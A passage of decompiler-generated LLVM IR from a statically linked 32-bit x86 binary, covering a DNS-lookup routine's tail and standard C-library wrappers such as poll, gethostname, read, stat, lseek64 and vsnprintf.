  %v8_804e5cc = call i32 @__dns_lookup(i8* %v0_804e54d.cast, i32 1, i32 %v2_804e5c1, i32 %v6_804e5cc)
  store i32 %v8_804e5cc, i32* %eax.global-to-local, align 4
  %v2_804e5d4 = icmp slt i32 %v8_804e5cc, 0
  %v1_804e5d6 = icmp eq i1 %v2_804e5d4, false
  br i1 %v1_804e5d6, label %dec_label_pc_804e5ec, label %dec_label_pc_804e5d8

dec_label_pc_804e5d8:                             ; preds = %dec_label_pc_804e5a9
  store i32 %arg6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e5e2

dec_label_pc_804e5e2:                             ; preds = %dec_label_pc_804e59d, %dec_label_pc_804e5d8
  store i32 1, i32* %v1_804e4a8, align 4
  store i32 2, i32* @esi, align 4
  br label %dec_label_pc_804e6d4

dec_label_pc_804e5ec:                             ; preds = %dec_label_pc_804e5a9
  %v12_804e5ec = icmp eq i32 %tmp24, 1
  %v1_804e5f1 = icmp eq i1 %v12_804e5ec, false
  br i1 %v1_804e5f1, label %dec_label_pc_804e6aa, label %dec_label_pc_804e5f7

dec_label_pc_804e5f7:                             ; preds = %dec_label_pc_804e5ec
  store i32 12, i32* @ebx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 12, i32* %eax.global-to-local, align 4
  store i32 34, i32* @esi, align 4
  %v2_804e615 = add i32 %v2_804e51a, -20
  %v13_804e615 = icmp slt i32 %v2_804e615, 0
  br i1 %v13_804e615, label %dec_label_pc_804e6b9, label %dec_label_pc_804e640.lr.ph

dec_label_pc_804e640.lr.ph:                       ; preds = %dec_label_pc_804e5f7
  %v0_804e622 = load i32, i32* @ebp, align 4
  %v2_804e623 = add i32 %v0_804e622, 12
  store i32 %v2_804e623, i32* %eax.global-to-local, align 4
  %v3_804e628 = inttoptr i32 %v2_804e623 to i8*
  %v4_804e628 = call i32 @memmove(i8* %v3_804e628, i32 0)
  %v0_804e62d = load i32, i32* @edi, align 4
  %v1_804e62d = load i32, i32* @ebx, align 4
  %v2_804e62d = add i32 %v0_804e62d, 4
  %v3_804e62d = add i32 %v2_804e62d, %v1_804e62d
  store i32 %v3_804e62d, i32* @esi, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_804e635 = inttoptr i32 %tmp to i32*
  %v2_804e635 = load i32, i32* %v1_804e635, align 4
  %v2_804e637 = inttoptr i32 %v3_804e62d to i32*
  store i32 %v2_804e635, i32* %v2_804e637, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804e640.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e640

dec_label_pc_804e640:                             ; preds = %dec_label_pc_804e640.lr.ph, %dec_label_pc_804e640
  %v0_804e640 = phi i32 [ %v0_804e640.pre, %dec_label_pc_804e640.lr.ph ], [ %v1_804e644, %dec_label_pc_804e640 ]
  %v1_804e640 = load i32, i32* @ebp, align 4
  %v5_804e640 = inttoptr i32 %v1_804e640 to i32*
  store i32 %v0_804e640, i32* %v5_804e640, align 4
  %v0_804e644 = load i32, i32* @esi, align 4
  %v1_804e644 = add i32 %v0_804e644, 4
  store i32 %v1_804e644, i32* @esi, align 4
  %v0_804e647 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e647 = add i32 %v0_804e647, 1
  store i32 %v1_804e647, i32* %eax.global-to-local, align 4
  %v15_804e648 = icmp eq i32 %v1_804e647, 0
  br i1 %v15_804e648, label %dec_label_pc_804e640, label %dec_label_pc_804e64e

dec_label_pc_804e64e:                             ; preds = %dec_label_pc_804e640
  %phitmp = mul i32 %v1_804e647, 4
  %v0_804e64e = load i32, i32* @ebp, align 4
  %v3_804e64e = add i32 %v0_804e64e, %phitmp
  %v4_804e64e = inttoptr i32 %v3_804e64e to i32*
  store i32 0, i32* %v4_804e64e, align 4
  %v3_804e656 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_804e656, i32* @ebx, align 4
  %v1_804e65a = icmp eq i32 %v3_804e656, 0
  br i1 %v1_804e65a, label %dec_label_pc_804e678, label %dec_label_pc_804e65e

dec_label_pc_804e65e:                             ; preds = %dec_label_pc_804e64e
  %v5_804e65e = inttoptr i32 %v3_804e656 to i8*
  %v3_804e65f = call i32 @strlen(i8* %v5_804e65e)
  store i32 %v3_804e65f, i32* @eax, align 4
  store i32 %v3_804e656, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v2_804e615, %v3_804e65f
  br i1 %tmp58, label %dec_label_pc_804e66b, label %dec_label_pc_804e678

dec_label_pc_804e66b:                             ; preds = %dec_label_pc_804e65e
  %v0_804e66c = load i32, i32* @esi, align 4
  %v5_804e66c = inttoptr i32 %v0_804e66c to i8*
  %v5_804e66d = call i32 @strcpy(i8* %v5_804e66c, i32 %v3_804e656)
  %v0_804e672 = load i32, i32* @esi, align 4
  store i32 %v0_804e672, i32* %eax.global-to-local, align 4
  store i32 %v3_804e656, i32* @ebx, align 4
  br label %dec_label_pc_804e67c

dec_label_pc_804e678:                             ; preds = %dec_label_pc_804e65e, %dec_label_pc_804e64e
  store i32 %arg3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e67c

dec_label_pc_804e67c:                             ; preds = %dec_label_pc_804e66b, %dec_label_pc_804e678
  %v0_804e680 = phi i32 [ %v0_804e672, %dec_label_pc_804e66b ], [ %arg3, %dec_label_pc_804e678 ]
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804e680 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804e680, i32* %v2_804e680, align 4
  %v0_804e682 = load i32, i32* @edi, align 4
  %v1_804e682 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e682 = add i32 %v1_804e682, 4
  %v3_804e682 = inttoptr i32 %v2_804e682 to i32*
  store i32 %v0_804e682, i32* %v3_804e682, align 4
  %v0_804e685 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e685 = add i32 %v0_804e685, 8
  %v2_804e685 = inttoptr i32 %v1_804e685 to i32*
  store i32 2, i32* %v2_804e685, align 4
  %v0_804e68c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e68c = add i32 %v0_804e68c, 12
  %v2_804e68c = inttoptr i32 %v1_804e68c to i32*
  store i32 4, i32* %v2_804e68c, align 4
  %v0_804e693 = load i32, i32* @ebp, align 4
  %v1_804e693 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e693 = add i32 %v1_804e693, 16
  %v3_804e693 = inttoptr i32 %v2_804e693 to i32*
  store i32 %v0_804e693, i32* %v3_804e693, align 4
  %v0_804e69a = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e69a, i32* %v1_804e453, align 4
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804e4a8, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e6b9

dec_label_pc_804e6aa:                             ; preds = %dec_label_pc_804e5ec
  store i32 %arg6, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804e4a8, align 4
  store i32 2, i32* @esi, align 4
  br label %dec_label_pc_804e6b9

dec_label_pc_804e6b9:                             ; preds = %dec_label_pc_804e5f7, %dec_label_pc_804e67c, %dec_label_pc_804e6aa
  %v3_804e6b9 = load i32, i32* %stack_var_-60, align 4
  %v2_804e6bd = call i32 @free(i32 %v3_804e6b9)
  store i32 %v2_804e6bd, i32* %eax.global-to-local, align 4
  %v3_804e6c2 = load i32, i32* %stack_var_-20, align 4
  %v2_804e6c6 = call i32 @free(i32 %v3_804e6c2)
  store i32 %v3_804e6c2, i32* %eax.global-to-local, align 4
  store i32 %v3_804e6b9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e6d4

dec_label_pc_804e6cf:                             ; preds = %dec_label_pc_804e4fb, %dec_label_pc_804e4da
  store i32 34, i32* @esi, align 4
  br label %dec_label_pc_804e6d4

dec_label_pc_804e6d4:                             ; preds = %dec_label_pc_804e4ca, %dec_label_pc_804e4b4, %entry, %dec_label_pc_804e6b9, %dec_label_pc_804e5e2, %dec_label_pc_804e558, %dec_label_pc_804e49d, %dec_label_pc_804e6cf
  %v0_804e6d4 = load i32, i32* @esi, align 4
  store i32 %v0_804e6d4, i32* %eax.global-to-local, align 4
  store i32 %v0_804e447, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804e6d4

; uselistorder directives
  uselistorder i32 %v3_804e656, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_804e644, { 1, 0 }
  uselistorder i32 %v1_804e517, { 2, 1, 0 }
  uselistorder i32 %v1_804e50d, { 1, 0 }
  uselistorder i32 %v1_804e4c2, { 1, 0 }
  uselistorder i32 %v2_804e4a8, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804e4a8, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32* %v1_804e453, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @free, { 28, 27, 13, 12, 11, 10, 26, 25, 24, 23, 22, 21, 20, 9, 8, 7, 6, 19, 18, 17, 16, 5, 0, 3, 33, 2, 32, 31, 30, 1, 29, 4, 15, 14 }
  uselistorder i32 (i8*, i32)* @memmove, { 1, 0 }
  uselistorder i32 255, { 2, 8, 3, 4, 0, 1, 5, 6, 7, 9 }
  uselistorder i32 %arg6, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 3, 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 7, 6, 5, 4, 0, 1, 3 }
  uselistorder i32 %arg2, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e6d4, { 7, 3, 4, 5, 0, 1, 6, 2 }
  uselistorder label %dec_label_pc_804e6b9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e67c, { 1, 0 }
  uselistorder label %dec_label_pc_804e640, { 1, 0 }
  uselistorder label %dec_label_pc_804e5e2, { 1, 0 }
  uselistorder label %dec_label_pc_804e4da, { 1, 2, 0 }
}

define i32 @__GI_poll() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e6e0 = load i32, i32* @ebx, align 4
  store i32 %v0_804e6e0, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* @ecx, align 4
  %v1_804e6ee = inttoptr i32 %tmp to %pollfd*
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v5_804e6f5 = call i32 @poll(%pollfd* %v1_804e6ee, i32 %tmp3, i32 %tmp2)
  store i32 %v5_804e6f5, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v5_804e6f5, -4095
  br i1 %tmp7, label %dec_label_pc_804e70e, label %dec_label_pc_804e702

dec_label_pc_804e702:                             ; preds = %entry
  %v1_804e702 = call i32 @__GI___errno_location(i32 %v0_804e6e0)
  %v0_804e707 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e707 = sub i32 0, %v0_804e707
  store i32 %v1_804e707, i32* %ebx.global-to-local, align 4
  %v2_804e709 = inttoptr i32 %v1_804e702 to i32*
  store i32 %v1_804e707, i32* %v2_804e709, align 4
  br label %dec_label_pc_804e70e

dec_label_pc_804e70e:                             ; preds = %entry, %dec_label_pc_804e702
  %v0_804e70f = phi i32 [ %v5_804e6f5, %entry ], [ -1, %dec_label_pc_804e702 ]
  %v2_804e70e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e70e, i32* @ebx, align 4
  ret i32 %v0_804e70f

; uselistorder directives
  uselistorder i32 %v5_804e6f5, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804e70e, { 1, 0 }
}

define i32 @__GI_gethostname() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-329 = alloca i32, align 4
  %stack_var_-394 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e710 = load i32, i32* @ebx, align 4
  store i32 %v0_804e710, i32* %stack_var_-4, align 4
  %v2_804e717 = ptrtoint i32* %stack_var_-394 to i32
  %v2_804e71c = call i32 @uname(i32 %v2_804e717)
  %v8_804e725 = icmp eq i32 %v2_804e71c, -1
  br i1 %v8_804e725, label %dec_label_pc_804e75e, label %dec_label_pc_804e728

dec_label_pc_804e728:                             ; preds = %entry
  %tmp13 = bitcast i32* %stack_var_-329 to i8*
  %v3_804e72d = call i32 @strlen(i8* %tmp13)
  %v1_804e733 = add i32 %v3_804e72d, 1
  store i32 %v1_804e733, i32* @eax, align 4
  %tmp15 = icmp ugt i32 %v1_804e733, %tmp4
  br i1 %tmp15, label %dec_label_pc_804e73d, label %dec_label_pc_804e74d

dec_label_pc_804e73d:                             ; preds = %dec_label_pc_804e728
  %v3_804e732 = ptrtoint i32* %stack_var_-329 to i32
  %v2_804e73d = call i32 @__GI___errno_location(i32 %v3_804e732)
  %v1_804e742 = inttoptr i32 %v2_804e73d to i32*
  store i32 22, i32* %v1_804e742, align 4
  %v2_804e766.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e75e

dec_label_pc_804e74d:                             ; preds = %dec_label_pc_804e728
  %v2_804e728 = ptrtoint i32* %stack_var_-329 to i32
  %v3_804e755 = inttoptr i32 %tmp to i8*
  %v4_804e755 = call i32 @strcpy(i8* %v3_804e755, i32 %v2_804e728)
  br label %dec_label_pc_804e75e

dec_label_pc_804e75e:                             ; preds = %entry, %dec_label_pc_804e73d, %dec_label_pc_804e74d
  %v2_804e766 = phi i32 [ %v0_804e710, %entry ], [ %v2_804e766.pre, %dec_label_pc_804e73d ], [ %v0_804e710, %dec_label_pc_804e74d ]
  %v0_804e75e = phi i32 [ -1, %entry ], [ -1, %dec_label_pc_804e73d ], [ 0, %dec_label_pc_804e74d ]
  store i32 %v2_804e766, i32* @ebx, align 4
  ret i32 %v0_804e75e

; uselistorder directives
  uselistorder i32* %stack_var_-329, { 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e75e, { 2, 1, 0 }
}

define i32 @__GI_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804e768 = load i32, i32* @ebx, align 4
  store i32 %v0_804e768, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* @ecx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804e77d = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804e77d, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_804e77d, -4095
  br i1 %tmp8, label %dec_label_pc_804e796, label %dec_label_pc_804e78a

dec_label_pc_804e78a:                             ; preds = %entry
  %v1_804e78a = call i32 @__GI___errno_location(i32 %v0_804e768)
  %v0_804e78f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e78f = sub i32 0, %v0_804e78f
  store i32 %v1_804e78f, i32* %ebx.global-to-local, align 4
  %v2_804e791 = inttoptr i32 %v1_804e78a to i32*
  store i32 %v1_804e78f, i32* %v2_804e791, align 4
  br label %dec_label_pc_804e796

dec_label_pc_804e796:                             ; preds = %entry, %dec_label_pc_804e78a
  %v0_804e797 = phi i32 [ %v4_804e77d, %entry ], [ -1, %dec_label_pc_804e78a ]
  %v2_804e796 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e796, i32* @ebx, align 4
  ret i32 %v0_804e797

; uselistorder directives
  uselistorder i32 %v4_804e77d, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e796, { 1, 0 }
}

define i32 @__GI_stat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e798 = load i32, i32* @ebx, align 4
  store i32 %v0_804e798, i32* %stack_var_-4, align 4
  %v12_804e799 = ptrtoint i32* %stack_var_-68 to i32
  %tmp8 = bitcast i32* %stack_var_-68 to %stat*
  store i32 %v12_804e799, i32* @ecx, align 4
  %v6_804e7a9 = call i32 @stat(i8* %arg1, %stat* %tmp8)
  store i32 %v6_804e7a9, i32* @ebx, align 4
  %tmp10 = icmp ult i32 %v6_804e7a9, -4095
  br i1 %tmp10, label %dec_label_pc_804e7c4, label %dec_label_pc_804e7b6

dec_label_pc_804e7b6:                             ; preds = %entry
  %v1_804e7b6 = call i32 @__GI___errno_location(i32 %v0_804e798)
  %v0_804e7bb = load i32, i32* @ebx, align 4
  %v1_804e7bb = sub i32 0, %v0_804e7bb
  %v2_804e7bd = inttoptr i32 %v1_804e7b6 to i32*
  store i32 %v1_804e7bb, i32* %v2_804e7bd, align 4
  %v2_804e7d9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e7d4

dec_label_pc_804e7c4:                             ; preds = %entry
  %v1_804e7c4 = icmp eq i32 %v6_804e7a9, 0
  %v1_804e7c6 = icmp eq i1 %v1_804e7c4, false
  br i1 %v1_804e7c6, label %dec_label_pc_804e7d4, label %dec_label_pc_804e7c8

dec_label_pc_804e7c8:                             ; preds = %dec_label_pc_804e7c4
  %v3_804e7cd = call i32 @__xstat_conv(i32* nonnull %stack_var_-68, i32 %arg2)
  %v0_804e7d4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e7d4

dec_label_pc_804e7d4:                             ; preds = %dec_label_pc_804e7c4, %dec_label_pc_804e7b6, %dec_label_pc_804e7c8
  %v2_804e7d9 = phi i32 [ %v0_804e798, %dec_label_pc_804e7c4 ], [ %v2_804e7d9.pre, %dec_label_pc_804e7b6 ], [ %v0_804e798, %dec_label_pc_804e7c8 ]
  %v0_804e7d4 = phi i32 [ %v6_804e7a9, %dec_label_pc_804e7c4 ], [ -1, %dec_label_pc_804e7b6 ], [ %v0_804e7d4.pre, %dec_label_pc_804e7c8 ]
  store i32 %v2_804e7d9, i32* @ebx, align 4
  ret i32 %v0_804e7d4

; uselistorder directives
  uselistorder i32 %v6_804e7a9, { 1, 2, 0, 3 }
  uselistorder i32 (i32*, i32)* @__xstat_conv, { 1, 0 }
  uselistorder label %dec_label_pc_804e7d4, { 2, 0, 1 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e7de = load i32, i32* @ebx, align 4
  store i32 %v0_804e7de, i32* %stack_var_-12, align 4
  %v15_804e7df = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v15_804e7df, i32* %esi.global-to-local, align 4
  %v1_804e807 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804e807, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_804e807, -4095
  br i1 %tmp18, label %dec_label_pc_804e821, label %dec_label_pc_804e813

dec_label_pc_804e813:                             ; preds = %entry
  %v2_804e7f2 = ashr i32 %arg3, 31
  %v1_804e813 = call i32 @__GI___errno_location(i32 %v2_804e7f2)
  %v0_804e818 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e818 = sub i32 0, %v0_804e818
  store i32 %v1_804e818, i32* %esi.global-to-local, align 4
  %v2_804e81a = inttoptr i32 %v1_804e813 to i32*
  store i32 %v1_804e818, i32* %v2_804e81a, align 4
  %v2_804e831.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e825

dec_label_pc_804e821:                             ; preds = %entry
  %v1_804e821 = icmp eq i32 %v1_804e807, 0
  br i1 %v1_804e821, label %dec_label_pc_804e828, label %dec_label_pc_804e825

dec_label_pc_804e825:                             ; preds = %dec_label_pc_804e821, %dec_label_pc_804e813
  %v2_804e831.pre = phi i32 [ %v0_804e7de, %dec_label_pc_804e821 ], [ %v2_804e831.pre.pre, %dec_label_pc_804e813 ]
  %v0_804e825 = phi i32 [ %v1_804e807, %dec_label_pc_804e821 ], [ -1, %dec_label_pc_804e813 ]
  %v1_804e825 = ashr i32 %v0_804e825, 31
  br label %dec_label_pc_804e82f

dec_label_pc_804e828:                             ; preds = %dec_label_pc_804e821
  %v2_804e828 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804e82f

dec_label_pc_804e82f:                             ; preds = %dec_label_pc_804e825, %dec_label_pc_804e828
  %v2_804e831 = phi i32 [ %v2_804e831.pre, %dec_label_pc_804e825 ], [ %v0_804e7de, %dec_label_pc_804e828 ]
  %v0_804e834 = phi i32 [ %v0_804e825, %dec_label_pc_804e825 ], [ %v2_804e828, %dec_label_pc_804e828 ]
  %storemerge = phi i32 [ %v1_804e825, %dec_label_pc_804e825 ], [ %tmp10, %dec_label_pc_804e828 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_804e831, i32* @ebx, align 4
  ret i32 %v0_804e834

; uselistorder directives
  uselistorder i32 %v1_804e807, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804e7de, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e82f, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804e83b = ptrtoint i32* %stack_var_12 to i32
  %v5_804e84d = inttoptr i32 %arg1 to i8*
  %v6_804e84d = call i32 @__GI_vsnprintf(i8* %v5_804e84d, i32 -1, i32 %arg2, i32 %v2_804e83b, i32 %v2_804e83b)
  ret i32 %v6_804e84d
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e858 = load i32, i32* @edi, align 4
  %v0_804e859 = load i32, i32* @esi, align 4
  %v0_804e85a = load i32, i32* @ebx, align 4
  store i32 %v0_804e85a, i32* %stack_var_-12, align 4
  %v12_804e85b = ptrtoint i32* %stack_var_-92 to i32
  %v4_804e85e = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e85e, i32* @esi, align 4
  store i32 208, i32* %stack_var_-92, align 4
  store i32 %v12_804e85b, i32* @edi, align 4
  %v2_804e887 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804e887, i32* @eax, align 4
  %v2_804e88c = call i32 @__stdio_init_mutex(i32* nonnull %stack_var_-36)
  %v0_804e899 = load i32, i32* @esi, align 4
  %v1_804e89b = sub i32 -1, %v0_804e899
  store i32 %v2_804e887, i32* %edx.global-to-local, align 4
  %tmp33 = icmp ult i32 %v1_804e89b, %arg2
  br i1 %tmp33, label %dec_label_pc_804e8a6, label %dec_label_pc_804e8a8

dec_label_pc_804e8a6:                             ; preds = %entry
  br label %dec_label_pc_804e8a8

dec_label_pc_804e8a8:                             ; preds = %entry, %dec_label_pc_804e8a6
  %v1_804e8ac = phi i32 [ %arg2, %entry ], [ %v1_804e89b, %dec_label_pc_804e8a6 ]
  %v3_804e8cc = bitcast i32* %stack_var_-92 to i8*
  %v4_804e8cc = call i32 @_vfprintf_internal(i8* %v3_804e8cc, i32 %arg3, i32 %arg4)
  store i32 %v4_804e8cc, i32* %edx.global-to-local, align 4
  %v0_804e8d6 = load i32, i32* @ebx, align 4
  %v1_804e8d6 = icmp eq i32 %v0_804e8d6, 0
  br i1 %v1_804e8d6, label %dec_label_pc_804e8f0, label %dec_label_pc_804e8da

dec_label_pc_804e8da:                             ; preds = %dec_label_pc_804e8a8
  %v15_804e8de = icmp eq i32 %v1_804e8ac, 0
  %v1_804e8e2 = icmp eq i1 %v15_804e8de, false
  br i1 %v1_804e8e2, label %dec_label_pc_804e8e9, label %dec_label_pc_804e8e4

dec_label_pc_804e8e4:                             ; preds = %dec_label_pc_804e8da
  %v1_804e8e4 = add i32 %v0_804e899, -1
  br label %dec_label_pc_804e8e9

dec_label_pc_804e8e9:                             ; preds = %dec_label_pc_804e8da, %dec_label_pc_804e8e4
  %stack_var_-76.0.in = phi i32 [ %v0_804e899, %dec_label_pc_804e8da ], [ %v1_804e8e4, %dec_label_pc_804e8e4 ]
  %stack_var_-76.0 = inttoptr i32 %stack_var_-76.0.in to i8*
  store i8 0, i8* %stack_var_-76.0, align 1
  %v0_804e8f0.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e8f5.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e8f0

dec_label_pc_804e8f0:                             ; preds = %dec_label_pc_804e8a8, %dec_label_pc_804e8e9
  %v2_804e8f5 = phi i32 [ %v0_804e85a, %dec_label_pc_804e8a8 ], [ %v2_804e8f5.pre, %dec_label_pc_804e8e9 ]
  %v0_804e8f0 = phi i32 [ %v4_804e8cc, %dec_label_pc_804e8a8 ], [ %v0_804e8f0.pre, %dec_label_pc_804e8e9 ]
  store i32 %v2_804e8f5, i32* @ebx, align 4
  store i32 %v0_804e859, i32* @esi, align 4
  store i32 %v0_804e858, i32* @edi, align 4
  ret i32 %v0_804e8f0

; uselistorder directives
  uselistorder i32 %v1_804e89b, { 1, 0 }
  uselistorder i32 %v0_804e899, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e8f0, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e9, { 1, 0 }
  uselistorder label %dec_label_pc_804e8a8, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %v0_804e8fc = load i32, i32* @ebp, align 4
  %v0_804e8fd = load i32, i32* @edi, align 4
  %v0_804e8fe = load i32, i32* @esi, align 4
  %v0_804e8ff = load i32, i32* @ebx, align 4
  %v0_804e903 = load i32, i32* @eax, align 4
  store i32 %v0_804e903, i32* @edi, align 4
  %v0_804e905 = load i32, i32* @ecx, align 4
  store i32 %v0_804e905, i32* @esi, align 4
  %v0_804e907 = load i32, i32* @edx, align 4
  store i32 %v0_804e907, i32* %stack_var_-17, align 4
  store i32 %v0_804e905, i32* @ebx, align 4
  %v2_804e90d = ptrtoint i32* %stack_var_-17 to i32
  store i32 %v2_804e90d, i32* @ebp, align 4
  %v1_804e9142 = icmp eq i32 %v0_804e905, 0
  br i1 %v1_804e9142, label %dec_label_pc_804e927, label %dec_label_pc_804e918.lr.ph

dec_label_pc_804e918.lr.ph:                       ; preds = %entry
  %v3_804e91c = bitcast i32* %stack_var_-17 to i8*
  %v4_804e91c20 = call i32 @__stdio_fwrite(i8* %v3_804e91c, i32 1, i32 %v0_804e903)
  %v8_804e92422 = icmp eq i32 %v4_804e91c20, 1
  %v0_804e91323 = load i32, i32* @ebx, align 4
  br i1 %v8_804e92422, label %dec_label_pc_804e913, label %dec_label_pc_804e927.loopexit

dec_label_pc_804e913:                             ; preds = %dec_label_pc_804e918.lr.ph, %dec_label_pc_804e913.dec_label_pc_804e918_crit_edge
  %v0_804e91324 = phi i32 [ %v0_804e913, %dec_label_pc_804e913.dec_label_pc_804e918_crit_edge ], [ %v0_804e91323, %dec_label_pc_804e918.lr.ph ]
  %v1_804e913 = add i32 %v0_804e91324, -1
  %v8_804e913 = icmp eq i32 %v1_804e913, 0
  store i32 %v1_804e913, i32* @ebx, align 4
  br i1 %v8_804e913, label %dec_label_pc_804e927.loopexit, label %dec_label_pc_804e913.dec_label_pc_804e918_crit_edge

dec_label_pc_804e913.dec_label_pc_804e918_crit_edge: ; preds = %dec_label_pc_804e913
  %v0_804e918.pre = load i32, i32* @edi, align 4
  %v4_804e91c = call i32 @__stdio_fwrite(i8* %v3_804e91c, i32 1, i32 %v0_804e918.pre)
  %v8_804e924 = icmp eq i32 %v4_804e91c, 1
  %v0_804e913 = load i32, i32* @ebx, align 4
  br i1 %v8_804e924, label %dec_label_pc_804e913, label %dec_label_pc_804e927.loopexit

dec_label_pc_804e927.loopexit:                    ; preds = %dec_label_pc_804e913.dec_label_pc_804e918_crit_edge, %dec_label_pc_804e913, %dec_label_pc_804e918.lr.ph
  %v1_804e927.ph = phi i32 [ %v0_804e91323, %dec_label_pc_804e918.lr.ph ], [ 0, %dec_label_pc_804e913 ], [ %v0_804e913, %dec_label_pc_804e913.dec_label_pc_804e918_crit_edge ]
  %v0_804e927.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e927

dec_label_pc_804e927:                             ; preds = %dec_label_pc_804e927.loopexit, %entry
  %v0_804e927 = phi i32 [ 0, %entry ], [ %v0_804e927.pre, %dec_label_pc_804e927.loopexit ]
  %v1_804e927 = phi i32 [ 0, %entry ], [ %v1_804e927.ph, %dec_label_pc_804e927.loopexit ]
  %v2_804e927 = sub i32 %v0_804e927, %v1_804e927
  store i32 %v0_804e8ff, i32* @ebx, align 4
  store i32 %v0_804e8fe, i32* @esi, align 4
  store i32 %v0_804e8fd, i32* @edi, align 4
  store i32 %v0_804e8fc, i32* @ebp, align 4
  ret i32 %v2_804e927

; uselistorder directives
  uselistorder i32 %v1_804e913, { 1, 0 }
  uselistorder i8* %v3_804e91c, { 1, 0 }
  uselistorder i32* %stack_var_-17, { 0, 2, 1 }
